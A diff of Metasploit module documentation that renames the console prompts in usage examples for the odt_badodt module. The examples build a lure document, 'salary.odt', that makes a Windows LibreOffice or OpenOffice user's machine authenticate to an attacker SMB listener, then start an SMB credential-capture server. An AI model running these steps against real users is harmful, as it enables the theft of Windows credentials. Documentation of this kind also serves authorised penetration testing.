@@ -47,14 +47,14 @@ set LISTENER 192.168.1.25
 Install LibreOffice 6.03 or Apache OpenOffice 4.1.5 on a Windows workstation.  (Note: This attack does not work against Mac or Linux versions.)
 
   ```
-  msf5 > use auxiliary/fileformat/odt_badodt 
-  msf5 auxiliary(fileformat/odt_badodt) > set FILENAME salary.odt
+  msf > use auxiliary/fileformat/odt_badodt 
+  msf auxiliary(fileformat/odt_badodt) > set FILENAME salary.odt
   FILENAME => salary.odt
-  msf5 auxiliary(fileformat/odt_badodt) > set LHOST 192.168.1.25
+  msf auxiliary(fileformat/odt_badodt) > set LHOST 192.168.1.25
   LHOST => 192.168.1.25
-  msf5 auxiliary(fileformat/odt_badodt) > set CREATOR A_USER
+  msf auxiliary(fileformat/odt_badodt) > set CREATOR A_USER
   CREATOR => A_USER
-  msf5 auxiliary(fileformat/odt_badodt) > exploit
+  msf auxiliary(fileformat/odt_badodt) > exploit
 
   [*] Generating Malicious ODT File 
   [*] SMB Listener Address will be set to 192.168.1.25
@@ -67,13 +67,13 @@ On an attacker workstation, use a tool to serve and capture an SMB share on port
 
   ```
   $ sudo ./msfconsole
-  msf5 > use auxiliary/server/capture/smb 
-  msf5 auxiliary(server/capture/smb) > run
+  msf > use auxiliary/server/capture/smb 
+  msf auxiliary(server/capture/smb) > run
   [*] Auxiliary module running as background job 0.
-  msf5 auxiliary(server/capture/smb) >
+  msf auxiliary(server/capture/smb) >
   [*] Server started.
 
-  msf5 auxiliary(server/capture/smb) >
+  msf auxiliary(server/capture/smb) >
   ```
 
 Leave the metasploit SMB server listening while the user opens the document.  Upon opening the ODT file, the user workstation will attempt to connect (and authenticate) to the attacker workstation:
